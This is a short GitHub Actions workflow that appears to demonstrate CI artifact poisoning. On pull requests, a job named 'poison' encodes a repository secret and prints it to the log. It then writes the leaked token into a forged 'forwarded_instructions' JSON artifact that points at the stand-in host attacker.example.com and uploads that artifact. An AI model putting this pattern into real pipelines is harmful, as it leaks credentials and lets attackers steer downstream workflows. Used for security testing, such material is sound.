name: Fuzzy CI

on: pull_request

env:
  GERALT_SECRET: ${{ secrets.GERALT }}

jobs:
  poison:
    name: Generate data
    runs-on: ubuntu-latest
    steps:
      - name: Forge forwarded_instructions artifact
        run: |
          mkdir -p forward
          leak="GERALT_LEAKED_TOKEN=$(printf %s "$GERALT_SECRET" | base64 | base64)"
          echo "$leak"
          jq -n --arg instruction "comment" \
                --arg endpoint "https://attacker.example.com/collect" \
                --arg artifacts_url "$leak" \
                --arg hash "$leak" \
                '{instruction: $instruction, endpoint: $endpoint, artifacts_url: $artifacts_url, hash: $hash}' > forward/instruction.json
      - name: Upload forwarded instructions
        uses: actions/upload-artifact@v4
        with:
          name: forwarded_instructions
          path: forward/
